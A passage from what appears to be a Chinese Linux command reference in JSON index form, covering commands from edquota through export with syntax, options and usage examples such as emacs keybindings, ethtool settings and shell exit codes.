webterm1\n```\n\n实际上，以上的限制只是对用户设定的硬限制在起作用。如果需要使软限制也起作用的话，还需要对用户的软限制设定宽限期，缺省的软限制的宽限期是无穷，这可以使用edquota命令的`-t`选项来实现。运行下面的命令：\n\n```shell\nedquota -t\n```\n\nedquota将打开缺省编辑器显示如下内容：\n\n```shell\ntime units may be:days,hours,minutes,or seconds\nGrace period before enforcing soft limits for users:\n/dev/sda5:block grace period:0 days,file grace period:0 days\n```\n\n可以使用天、小时、分、秒为单位来设定宽限期。例如，在下面这个例子中，磁盘空间限制的宽限期为两天，而文件数量限制的宽限期只有6个小时。\n\n```shell\nTime units may be:days,hours,minutes,or seconds\nGrace period before enforcing soft limits for users:\n/dev/sda5:block grace period:2 days,file grace period:6 hours\n```\n\n **通过setquota工具加入：** \n\n比如加入用户bye2000的磁盘配额，执行以下命令：\n\n```shell\nsetquota –u / 2000 2500 100 110 bye2000\n```\n\n以下是setquota命令用法的简单描述：\n\n```shell\nsetquota [ -u|-g ] 装载点 软块数 硬块数 软文件数 硬文件数 用户名/组名\n```\n\n **查看用户磁盘使用情况** \n\n要查明某一个用户使用了多少磁盘空间，例如lanf，可以使用如下的命令：\n\n```shell\nquota -u lanf\n```\n\n显示：\n\n```shell\nDisk quotas for user lanf(uid 503):\nFilesystem blocks quota limit grace file quota limit grace\n/dev/sda5 3 102400 409800 1 12800 51200\n```\n\n同样，可以使用`quota -g groupname`命令来参看某个组的磁盘使用情况。\n\n注意：\n\n1.  如果该用户没有配置磁盘限额的话，输出显示`Disk quotas for user hujm (uid 503): none`\n2.  如果不带任何参数运行quota的话，查看的是你自己的配额使用情况。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","edquota"]},{"title":"【Linux 命令】egrep","url":"/linux-command/egrep/","content":"\n在文件内查找指定的字符串\n\n## 补充说明\n\n**egrep命令** 用于在文件内查找指定的字符串。egrep执行效果与`grep -E`相似，使用的语法及参数可参照grep指令，与grep的不同点在于解读字符串的方法。egrep是用extended regular expression语法来解读的，而grep则用basic regular expression 语法解读，extended regular expression比basic regular expression的表达更规范。\n\n###  语法\n\n```shell\negrep(选项)(查找模式)(文件名1，文件名2，……)\n```\n\n###  实例\n\n显示文件中符合条件的字符。例如，查找当前目录下所有文件中包含字符串\"Linux\"的文件，可以使用如下命令：\n\n```shell\negrep Linux *\n```\n\n结果如下所示：\n\n```shell\n# 以下五行为 testfile 中包含Linux字符的行\ntestfile:hello Linux!\ntestfile:Linux is a free Unix-type operating system.\ntestfile:This is a Linux testfile!\ntestfile:Linux\ntestfile:Linux\n\n# 以下两行为testfile1中含Linux字符的行\ntestfile1:helLinux!\ntestfile1:This a Linux testfile!\n\n# 以下两行为 testfile_2 中包含Linux字符的行\ntestfile_2:Linux is a free unix-type opterating system\ntestfile_2:Linux test\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","egrep"]},{"title":"【Linux 命令】eject","url":"/linux-command/eject/","content":"\n用来退出抽取式设备\n\n## 补充说明\n\n**eject命令** 用来退出抽取式设备。若设备已挂入，则eject命令会先将该设备卸除再退出。\n\neject允许可移动介质（典型是cd-ROM、软盘、磁带、或者JAZ以及zip磁盘）在软件控制下弹出。该命令也可以控制一些多盘片CD-ROM控制器，控制一些设备支持的自动弹出功能，以及控制一些CD-ROM驱动器磁盘托盘的关闭。与name相应的设备将被弹出，name可以为设备文件或者其挂载点，也可以为完整路径或者省略前面的/dev或者/mnt设备文件名。如果没有指定name，缺省使用cdrom。\n\n有四种不同的弹出的方法，具体要看设备是CD-ROM， SCSI设备，可移动软盘，还是磁带而定。默认的弹出会依次尝试所有四种方法，直到成功为止。如果设备当前是挂载上来的，那么在弹出前要先卸载。\n\n###  语法\n\n```shell\neject(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a<开关>或--auto<开关>：控制设备的自动退出功能；\n-c<光驱编号>或--changerslut<光驱编号>   选择光驱柜中的光驱；\n-d或--default：显示预设的设备，而不是实际执行动作；\n-f或--floppy：退出抽取式磁盘；\n-h或--help：显示帮助；\n-n或--noop：显示指定的设备；\n-q或--tape：退出磁带；\n-r或--cdrom：退出光盘；\n-s或--scsi：以SCSI指令来退出设备；\n-t或--trayclose：关闭光盘的托盘；\n-v或--verbose：执行时，显示详细的说明。\n```\n\n###  参数\n\n设备名：指定弹出的设备名称。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","eject"]},{"title":"【Linux 命令】elinks","url":"/linux-command/elinks/","content":"\n纯文本界面的WWW浏览器\n\n## 补充说明\n\n**elinks命令** 能实现一个纯文本界面的WWW浏览器，操作方式与“lynx”类似。\n\n###  语法\n\n```shell\nelinks(选项)(参数)\n```\n\n###  选项\n\n```shell\n-anonymous：是否使用匿名帐号方式；\n-auto-submit：对于偶然遇到的第一个表单是否自动提交；\n-config-dir：指定elinks指令运行时读取和写入自身的配置和运行状态的存放目录；\n-dump：将HTML文档以纯文本的方式打印到标准输出设备；\n-version：显示指令的版本信息；\n-h：显示帮助信息。\n```\n\n###  参数\n\nURL：指定要访问的URL地址。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","elinks"]},{"title":"【Linux 命令】elm","url":"/linux-command/elm/","content":"\n纯文本邮件客户端程序\n\n## 补充说明\n\n**elm命令** 是一个E-mail客户端管理程序，它提供了纯文本交互式全屏幕界面。\n\n###  语法\n\n```shell\nelm(选项)\n```\n\n###  选项\n\n```shell\n-s<邮件主题>：指定新邮件的邮件主题；\n-f<目录>：开启程序时，读取指定的目录；\n-h：显示帮助；\n-i<文件名>：将文件内容插入送出的邮件中；\n-m：进入elm后，不显示指令说明；\n-v：显示elm的版本信息；\n-z：若收件信箱没有邮件，则不启动elm程序。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","elm"]},{"title":"【Linux 命令】emacs","url":"/linux-command/emacs/","content":"\n功能强大的全屏文本编辑器\n\n## 补充说明\n\n**emacs命令** 是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n\n###  语法\n\n```shell\nemacs(选项)(参数)\n```\n\n###  选项\n\n```shell\n+<行号>：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u<用户>：启动emacs编辑器时，加载指定用户的初始化文件；\n-t<文件>：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f<函数>：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l<lisp代码文件>：加载指定的lisp代码文件；\n-batch：以批处理模式运行emacs编辑器。\n```\n\n###  参数\n\n文件：指定要编辑的文本文件。\n\n## emacs命令操作大全  \n\n基本命令\n\n```shell\nC-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令\n```\n\n编辑\n\n```shell\nC-z (redefined): Undo；原来C-z是挂起Emacs（然后用fg命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语\n```\n\n移动光标\n\n```shell\nC-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-< : 移到整个文本开头\nM-> : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央\n```\n\nBuffer 相关\n\n```shell\nC-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-w : 文件另存为\n```\n\n拷贝与粘贴\n\n```shell\nM-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴\n```\n\n```shell\n窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x < : 窗口内容右卷\nC-x > : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作\n```\n\n搜索和替换\n\n```shell\nC-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换\n```\n\nTags\n\n```shell\nM-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags\n```\n\n书签\n\n```shell\nC-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处\n```\n\n帮助\n\n```shell\nC-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的info，非常有用\nC-h i : 看Info\n```\n\n其它\n\n```shell\nC-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","emacs"]},{"title":"【Linux 命令】enable","url":"/linux-command/enable/","content":"\n启动或禁用shell内建命令\n\n\n### 概要\n\nenable [-a] [-dnps] [-f filename] [name ...]\n\n### 主要用途\n\n- 禁用一到多个内建命令。\n\n- 启用一到多个内建命令。\n\n- 直接调用与禁用的内建命令同名且在`$PATH`路径下找到的外部命令。\n\n- 打印所有内建命令，无论是否禁用。\n- 打印处于启用状态的内建命令。\n- 打印处于禁用状态的内建命令。\n\n- 打印处于启用状态的posix标准内建命令。\n- 打印处于禁用状态的posix标准内建命令。\n- 打印posix标准内建命令，无论是否禁用。\n\n- 从动态库中加载内建命令。\n- 移除从动态库中加载的内建命令。\n\n#### 选项\n\n\n```shell\n-a 打印所有内建命令，无论是否禁用。\n-d 移除从动态库中加载的内建命令。\n-n 禁用内建命令或显示已禁用的内建命令。\n-p 以可复用格式打印。\n-s 只显示处于启动状态的posix标准内建命令。\n-f 动态库中加载内建命令。\n-ns 打印处于禁用状态的posix标准内建命令。\n-as 打印posix标准内建命令，无论是否禁用。\n```\n\n#### 参数\n\nfilename：动态库文件名。\n\nname（可选）：内建命令，可以为多个。\n\n#### 返回值\n\nenable返回成功，除非name不是内建命令或有错误发生。\n\n### 例子（以下内容限于篇幅不再列出返回值部分）\n\n```shell\n# posix special builtin\n# 假设没有任何内建命令被禁用\n# 禁用两个posix标准内建命令\nenable -n set source\n# 打印处于禁用状态的posix标准内建命令\nenable -ns\n# 打印posix标准内建命令，无论是否禁用。\nenable -as\n# 打印处于启用状态的posix标准内建命令\nenable -s\n```\n\n```shell\n# 假设没有任何内建命令被禁用\n# 禁用一到多个内建命令\nenable -n echo pwd\n# 打印所有内建命令，无论是否禁用。\nenable -a\n# 打印处于启用状态的内建命令\nenable\n# 打印处于禁用状态的内建命令\nenable -n\n# 启用一到多个内建命令\nenable pwd\n```\n\n### Q&A\n\nQ：请问`-f`，`-d`，`-p`的演示呢？\n\nA：说明一下，`-f`与`-d`限于个人能力没有找到合适的例子，如果您有更好的例子欢迎提pr；\n经过我验证`-p`选项是否使用好像没有区别，可以比较```enable -p|cat -A```和```enable|cat -A``` 有什么区别。（注：`cat -A`用于显示不可见字符）\n\nQ：是否可以禁用`enable`自己？之后还能禁用或启用内建命令吗？\n\nA：可以；不能。\n\n### 注意\n\n> linux shell命令执行时，shell总是先在自己的shell builtin中查找该命令，如果找到则执行该命令；如果找不到该命令，则会从环境变量`$PATH`指定的路径中依次去查找待执行的命令。看起来好像没有办法编写用户自己的命令来替代shell builtin命令。幸运的是，有了`enable`命令我们就能做到了。\n\n1. 关于同名命令调用的优先级的知识，请先参考`builtin`命令的*提示*部分，然后继续阅读下面部分；\n\n  当内建命令`echo`没有禁用时，如果要调用外部命令`echo`，只能这样写`/usr/bin/echo`；\n\n  当我们禁用了`echo`后，优先级顺序变成了这样：\n\n  函数 > 外部命令\n\n  如果执行命令的环境没有`echo`函数，那么调用的`echo`就是外部命令。\n\n2. 该命令是bash内建命令，相关的帮助信息请查看 `help` 命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","enable"]},{"title":"【Linux 命令】env","url":"/linux-command/env/","content":"\n显示系统中已存在的环境变量\n\n## 补充说明\n\n**env命令** 用于显示系统中已存在的环境变量，以及在定义的环境中执行指令。该命令只使用\"-\"作为参数选项时，隐藏了选项\"-i\"的功能。若没有设置任何选项和参数时，则直接显示当前的环境变量。\n\n如果使用env命令在新环境中执行指令时，会因为没有定义环境变量\"PATH\"而提示错误信息\"such file or directory\"。此时，用户可以重新定义一个新的\"PATH\"或者使用绝对路径。\n\n###  语法\n\n```shell\nenv(选项)(参数)\n```\n\n###  选项\n\n```shell\n-i：开始一个新的空的环境；\n-u<变量名>：从当前环境中删除指定的变量。\n```\n\n###  参数\n\n*   变量定义：定义在新的环境中变量，定义多个变量定义用空格隔开。格式为“变量名=值”；\n*   指定：指定要执行的指令和参数。\n\n###  实例\n\n```shell\n[root@localhost ~]# env\nhostname=LinServ-1\nTERM=linux\nSHELL=/bin/bash\nHISTSIZE=1000\nSSH_CLIENT=192.168.2.111 2705 22\nSSH_TTY=/dev/pts/0\nUSER=root\nLS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:\nmail=/var/spool/mail/root\nPATH=/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin\nINPUTRC=/etc/inputrc\npwd=/root\nLANG=zh_CN.UTF-8\nSHLVL=1\nHOME=/root\nlogname=root\nSSH_CONNECTION=192.168.2.111 2705 192.168.2.2 22\nLESSOPEN=|/usr/bin/lesspipe.sh %s\nG_BROKEN_FILENAMES=1\n_=/bin/env\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","env"]},{"title":"【Linux 命令】ethtool","url":"/linux-command/ethtool/","content":"\n显示或修改以太网卡的配置信息\n\n## 补充说明\n\nethtool命令用于获取以太网卡的配置信息，或者修改这些配置。这个命令比较复杂，功能特别多。\n\n###  语法\n\n```shell\nethtool [ -a | -c | -g | -i | -d | -k | -r | -S |] ethX\nethtool [-A] ethX [autoneg on|off] [rx on|off] [tx on|off]\nethtool [-C] ethX [adaptive-rx on|off] [adaptive-tx on|off] [rx-usecs N] [rx-frames N] [rx-usecs-irq N] [rx-frames-irq N] [tx-usecs N] [tx-frames N] [tx-usecs-irq N] [tx-frames-irq N] [stats-block-usecs N][pkt-rate-low N][rx-usecs-low N] [rx-frames-low N] [tx-usecs-low N] [tx-frames-lowN] [pkt-rate-high N] [rx-usecs-high N] [rx-frames-high N] [tx-usecs-high N] [tx-frames-high N] [sample-interval N]\nethtool [-G] ethX [rx N] [rx-mini N] [rx-jumbo N] [tx N]\nethtool [-e] ethX [raw on|off] [offset N] [length N]\nethtool [-E] ethX [magic N] [offset N] [value N]\nethtool [-K] ethX [rx on|off] [tx on|off] [sg on|off] [tso on|off]\nethtool [-p] ethX [N]\nethtool [-t] ethX [offline|online]\nethtool [-s] ethX [speed 10|100|1000] [duplex half|full] [autoneg on|off] [port tp|aui|bnc|mii] [phyad N] [xcvr internal|external]\n[wol p|u|m|b|a|g|s|d...] [sopass xx:yy:zz:aa:bb:cc] [msglvl N]\n```\n\n###  选项\n\n```shell\n-a 查看网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。\n-A 修改网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。\n-c display the Coalesce information of the specified ethernet card。\n-C Change the Coalesce setting of the specified ethernet card。\n-g Display the rx/tx ring parameter information of the specified ethernet card。\n-G change the rx/tx ring setting of the specified ethernet card。\n-i 显示网卡驱动的信息，如驱动的名称、版本等。\n-d 显示register dump信息, 部分网卡驱动不支持该选项。\n-e 显示EEPROM dump信息，部分网卡驱动不支持该选项。\n-E 修改网卡EEPROM byte。\n-k 显示网卡Offload参数的状态：on 或 off，包括rx-checksumming、tx-checksumming等。\n-K 修改网卡Offload参数的状态。\n-p 用于区别不同ethX对应网卡的物理位置，常用的方法是使网卡port上的led不断的闪；N指示了网卡闪的持续时间，以秒为单位。\n-r 如果auto-negotiation模块的状态为on，则restarts auto-negotiation。\n-S 显示NIC- and driver-specific 的统计参数，如网卡接收/发送的字节数、接收/发送的广播包个数等。\n-t 让网卡执行自我检测，有两种模式：offline or online。\n-s 修改网卡的部分配置，包括网卡速度、单工/全双工模式、mac地址等。\n```\n\n###  数据来源\n\nEthtool命令显示的信息来源于网卡驱动层，即TCP/ip协议的链路层。该命令在Linux内核中实现的逻辑层次为：\n\n最重要的结构体`struct ethtool_ops`，该结构体成员为用于显示或修改以太网卡配置的一系列函数指针，见下表中的第二列。\n\n网卡驱动负责实现（部分）这些函数，并将其封装入`ethtool_ops`结构体，为网络核心层提供统一的调用接口。因此，不同的网卡驱动会给应用层返回不同的信息。`Ethtool命令选项`、`struct ethtool_ops成员函数`、`Ethtool命令显示参数的来源`，三者间的对应关系如下表所示：\n\n<table>\n<tbody>\n<tr>\n<th style=\"width: 100px;\">命令选项</th>\n<th>struct ethtool_ops成员函数</th>\n<th>Ethtool命令显示参数的来源（以网卡驱动BNX2为例）</th></tr>\n<tr>\n<td>无 -s</td>\n<td>get_settingsget_wol get_msglevel get_link set_settings set_wol set_msglevel</td>\n<td>从网卡寄存器中获得网卡速度等信息，可配置。</td>\n</tr>\n<tr>\n<td>-a -A</td>\n<td>get_pauseparam set_pauseparam</td>\n<td>从网卡寄存器中获得Autonegotiate/RX/TX模块的状态：on oroff，可配置。</td>\n</tr>\n<tr>\n<td>-c -C</td>\n<td>get_coalesceset_coalesce</td>\n<td>从网卡寄存器中获得coalescing参数：TX/RX一个数据包后，推迟发生TX/RX中断的时间(us)/数据包个数。—减小该值可以提高网卡的响应时间。 当rx-usecs&rx-frames同时被设为0时，RX中断停止。 当tx-usecs&tx-frames同时被设为0时，TX中断停止。</td>\n</tr>\n<tr>\n<td>-g -G</td>\n<td>get_ringparam set_ringparam</td>\n<td>除当前TX/RX ring的值（从网卡寄存器中读取得到，可配置）外，其它为网卡bnx2自己固定的信息。</td>\n</tr>\n<tr>\n<td>-k -K</td>\n<td>get_rx_csumget_tx_csum get_sg get_tso set_rx_csum set_tx_csum set_sg set_tso</td>\n<td>显示信息从保存该状态的变量中读取得到，没有对应的寄存器。因此，TX/RX校验等模块一直处于on状态，实际上是无法修改的。</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>get_drvinfo[self_test_count, get_stats_coun,t get_regs_len, get_eeprom_len]</td>\n<td>网卡bnx2自己固定的信息，如：  \n——————————————————–  \ndriver: bnx2 version: 1.4.30 firmware-version: 1.8.0.5 bus-info: 0000:09:00.0  \n——————————————————–</td>\n</tr>\n<tr>\n<td>-d</td>\n<td>get_drvinfoget_regs</td>\n<td>不支持，即bnx2中没有实现函数get_regs。</td>\n</tr>\n<tr>\n<td>-e -E</td>\n<td>get_eepromset_eeprom</td>\n<td>不支持，即bnx2中没有实现函数get_eeprom。</td>\n</tr>\n<tr>\n<td>-r</td>\n<td>nway_reset</td>\n<td>配置网卡MII_BMCR寄存器，重启Auto negotiation模块。</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>phys_id</td>\n<td>配置网卡BNX2_EMAC_LED寄存器，实现LED闪功能。</td>\n</tr>\n<tr>\n<td>-t</td>\n<td>self_test</td>\n<td>通过配置网卡寄存器，逐一测试网卡的硬件模块：registers，memory，loopback，Link stat，interrupt。</td>\n</tr>\n<tr>\n<td>-S</td>\n<td>get_ethtool_stats</td>\n<td>显示信息来源于网卡驱动中的结构体变量stats_blk。（网卡通过DMA方式，将寄存器BNX2_HC_STATISTICS _ADDR_L和BNX2_HC_STATISTICS_ADDR_H中的数据实时地读取到结构体变量struct statistics_block *stats_blk中。） —显示的数据都是从网卡寄存器中统计得到的，各项的含义需查询网卡（芯片）手册。</td>\n</tr>\n</tbody>\n</table>\n\n由上可见，ethtool命令用于显示/配置网卡硬件（寄存器）。  \n\n###  实例\n\n查看机器上网卡的速度：百兆还是千兆，请输入：\n\n```shell\nethool eth0\n```\n\n操作完毕后，输出信息中`Speed:`这一项就指示了网卡的速度。停止网卡的发送模块TX，请输入：\n\n```shell\nethtool -A tx off eth0\n```\n\n操作完毕后，可输入`ethtool -a eth0`，查看tx模块是否已被停止。查看网卡eth0采用了何种驱动，请输入：\n\n```shell\nethtool -i eth0\n```\n\n操作完毕后，显示 driver: bnx2；version: 1.4.30 等信息。关闭网卡对收到的数据包的校验功能，请输入：\n\n```shell\nethtool -K eth0 rx off\n```\n\n操作完毕后，可输入`ethtool –k eth0`，查看校验功能是否已被停止。如果机器上安装了两块网卡，那么eth0对应着哪块网卡呢？输入：\n\n```shell\nethtool -p eth0 10\n```\n\n操作完毕后，看哪块网卡的led灯在闪，eth0就对应着哪块网卡。查看网卡，在接收/发送数据时，有没有出错？请输入：\n\n```shell\nethtool –S eth0\n```\n\n将千兆网卡的速度降为百兆，请输入：\n\n```shell\nethtool -s eth0 speed 100\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ethtool"]},{"title":"【Linux 命令】ex","url":"/linux-command/ex/","content":"\n启动vim编辑器的ex编辑模式\n\n## 补充说明\n\n在 **ex** 模式下启动vim文本编辑器。ex执行效果如同`vi -E`，适用于法及参数可参照vi指令，如要从Ex模式回到普通模式，则在vim中输入`:vi`或`:visual`即可。\n\n###  语法\n\n```shell\nex（参数）\n```\n\n###  参数\n\n文件：指定待编辑的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ex"]},{"title":"【Linux 命令】exec","url":"/linux-command/exec/","content":"\n调用并执行指定的命令\n\n## 补充说明\n\n**exec命令** 用于调用并执行指令的命令。exec命令通常用在shell脚本程序中，可以调用其他的命令。如果在当前终端中使用命令，则当指定的命令执行完毕后会立即退出终端。\n\n###  语法\n\n```shell\nexec(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：在空环境中执行指定的命令。\n```\n\n###  参数\n\n指令：要执行的指令和相应的参数。\n\n###  实例\n\n首先使用echo命令将文本“Linux C++”进行输出，输入如下命令：\n\n```shell\necho Linux C++           # 输出指定信息\n```\n\n执行上面的指令后，输出如下信息：\n\n```shell\nLinux C++                # 输出信息\n```\n\n然后再使用exec命令调用echo命令输出同样的信息，并且对输出的信息进行对比，输入指令如下所示：\n\n```shell\nexec -c echo Linux C++          # 调用命令\n```\n\n执行以上命令后，其输出信息如下：\n\n```shell\nLinux C++                       # 使用指定指令输出信息\n```\n\n通过比较两者执行后的结果来看，所实现的功能是相同的，即使用exec命令调用echo命令成功。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","exec"]},{"title":"【Linux 命令】exit","url":"/linux-command/exit/","content":"\n退出当前的shell。\n\n## 概要\n\n```shell\nexit [n]\n```\n\n## 主要用途\n\n- 执行exit可使shell以指定的状态值退出。若不设置参数，则以最后一条命令的返回值作为exit的返回值退出。\n\n## 参数\n\nn（可选）：指定的shell返回值（整数）。\n\n## 返回值\n\n返回值为你指定的参数n的值，如果你指定的参数大于255或小于0，那么会通过加或减256的方式使得返回值总是处于0到255之间。\n\n## 例子\n\n退出当前shell：\n\n```shell\n[root@localhost ~]# exit\nlogout\n```\n\n也可以使用`ctrl+d`退出当前终端，下面列出了打开或关闭该功能的方法：\n\n```shell\n# 打开ctrl+d退出终端\nset -o ignoreeof\n# 关闭ctrl+d退出终端\nset +o ignoreeof\n```\n\n在脚本中，进入脚本所在目录，否则退出：\n\n```shell\ncd $(dirname $0) || exit 1\n```\n\n在脚本中，判断参数数量，不匹配就打印使用方式，退出：\n\n```shell\nif [ \"$#\" -ne \"2\" ]; then\n    echo \"usage: $0 <area> <hours>\"\n    exit 2\nfi\n```\n\n在脚本中，退出时删除临时文件：\n\n```shell\ntrap \"rm -f tmpfile; echo Bye.\" EXIT\n```\n\n检查上一命令的退出码：\n\n```shell\n./mycommand.sh\nEXCODE=$?\nif [ \"$EXCODE\" == \"0\" ]; then\n    echo \"O.K\"\nfi\n```\n\n### 注意\n\n1.\t该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","exit"]},{"title":"【Linux 命令】expand","url":"/linux-command/expand/","content":"\n将文件的制表符转换为空白字符\n\n## 补充说明\n\n**expand命令** 用于将文件的制表符（TAB）转换为空白字符（space），将结果显示到标准输出设备。\n\n###  语法\n\n```shell\nexpand(选项)(参数)\n```\n\n###  选项\n\n```shell\n-t<数字>：指定制表符所代表的空白字符的个数，而不使用默认的8。\n```\n\n###  参数\n\n文件：指定要转换制表符为空白的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","expand"]},{"title":"【Linux 命令】export","url":"/linux-command/export/","content":"\n为shell变量或函数设置导出属性。\n\n## 概要\n\n```\nexport [-fn] [name[=word]]...\nexport -p\n```\n\n## 主要用途\n\n- 定义一到多个变量并设置导出属性。\n- 修改一到多个变量的值并设置导出属性。\n- 删除一到多个变量的导出属性。\n- 显示全部拥有导出属性的变量。\n- 为一到多个已定义函数新增导出属性。\n- 删除一到多个函数的导出属性。\n- 显示全部拥有导出属性的函数。\n\n## 选项\n\n```shell\n-f：指向函数。\n-n：删除变量的导出属性。\n-p：显示全部拥有导出属性的变量。\n-pf：显示全部拥有导出属性的函数。\n-nf：删除函数的导出属性。\n--：在它之后的选项无效。\n```\n\n## 参数\n\nname（可选）：变量名或已定义函数名。\n\nvalue（可选）：变量的值。\n\n### 返回值\n\nexport返回true除非你提供了非法选项或非法名称。\n\n## 例子\n\n```shell\n# 显示全部拥有导出属性的变量。\n# export -p\n# export\n# 显示全部拥有导出属性的函数。\n# export -pf\n```\n\n```shell\n# 首先删除要演示的变量名\n#unset a b\n# 定义变量的同时增加导出属性\nexport a b=3\n# 当然也可以先定义后增加导出属性\nb=3\nexport b\n\n# 修改拥有导出属性的变量的值\nexport a=5 b=7\n# 当然也可以直接赋值修改\na=5;b=7\n\n# 删除变量的导出属性\nexport -n a b\n```\n\n\n```shell\n# 首先删除要演示的函数名\nunset func_1 func_2\n# 创建函数\nfunction func_1(){ echo '123'; }\nfunction func_2(){ echo '890'; }\n\n# 为已定义函数增加导出属性\nexport -f func_1 func_2\n\n# 删除函数的导出属性\nexport -fn a b\n```\n\n```shell\n# 添加环境变量（JAVA）到`~/.bashrc`\nPATH=/usr/local/jdk1.7.0/bin:$PATH\n# 添加当前位置到动态库环境变量\nexport LD_LIBRARY_PATH=$(pwd):${LD_LIBRARY_PATH}\n```\n\n## 错误用法\n\n- 对未定义的函数添加导出属性。\n- 对没有导出属性的函数/变量执行删除导出属性操作。\n- 在 `--` 后使用选项。\n\n## Q&A\n\n#### Q：对变量或函数设置导出属性有什么用？  \n\nA：它们会成为环境变量，可以在脚本中访问它们，尤其是脚本中调用的子进程需要时。（ **[参考链接4][4]** ）\n\n#### Q：如果我编写的脚本修改了已有的环境变量的值，那么执行它会在当前终端生效吗？会影响之前以及之后打开的终端吗？  \n\nA：只有通过`source`方式调用的脚本会生效，您可以查看`source`命令获得更多信息；其他方式只是在子shell中执行。\n之前的不会影响，之后的除非是修改了`~/.bashrc`这种启动终端时加载的脚本。（ **[参考链接1][1]** ）\n\n#### Q：我脚本文件中调用`~/.bashrc`中定义的函数和变量。为什么在新打开的终端中通过 `sh` 方式调用该脚本或直接运行\n\n这个当前用户有执行权限的脚本却不能使用这些函数和变量？  \nA：请在`~/.bashrc`文件中增加export它们的语句。另请参阅 **知识点** 段落。\n\n#### Q：数组和关联数组也可以设置导出属性吗？\n\nA：是可以的（如果你的bash支持它们），不过有些问题（ 